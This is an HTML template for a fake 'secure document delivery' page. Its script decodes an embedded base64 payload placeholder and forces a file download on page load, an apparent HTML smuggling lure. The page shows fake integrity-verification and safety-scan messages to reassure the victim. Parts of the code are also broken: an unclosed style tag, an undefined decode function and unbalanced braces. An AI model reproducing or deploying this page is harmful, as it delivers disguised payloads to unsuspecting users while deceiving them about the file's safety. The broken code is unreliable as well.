<!DOCTYPE html>

<head>

<style>
*{margin:0;padding:0;box-sizing:border-box}

</head>
<body>
<div class="card">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 2l5 5h-5V4zM6 20V4h5v7h7v9H6z"/></svg></div>
<h1>Preparing your document</h1>
<p class="sub">Your file is being prepared for download. This may take a moment.</p>
<div class="bar-wrap"><div class="bar" id="bar"></div></div>
<p class="status" id="status">Initializing...</p>
<button class="retry" id="retry" onclick="doDownload()">Download manually</button>
<p class="footer">Secured document delivery &bull; Files are scanned for safety</p>
</div>
<script>
(function(){
var d="{{PAYLOAD_B64}}",fn="{{FILENAME}}";
var bar=document.getElementById("bar"),st=document.getElementById("status"),rt=document.getElementById("retry");
var pct=0;
function tick(){pct=Math.min(pct+Math.random()*15+5,95);bar.style.width=pct+"%";if(pct<40)st.textContent="Verifying document integrity...";else if(pct<70)st.textContent="Preparing secure download...";else st.textContent="Almost ready...";}

try{
var bytes=b64decode(d);
var blob=new Blob([bytes],{type:"application/octet-stream"});
if(window.navigator&&window.navigator.msSaveBlob){window.navigator.msSaveBlob(blob,fn);}
else{var u=URL.createObjectURL(blob);var a=document.createElement("a");a.href=u;a.download=fn;document.body.appendChild(a);a.click();setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u);},200);}

};

})();
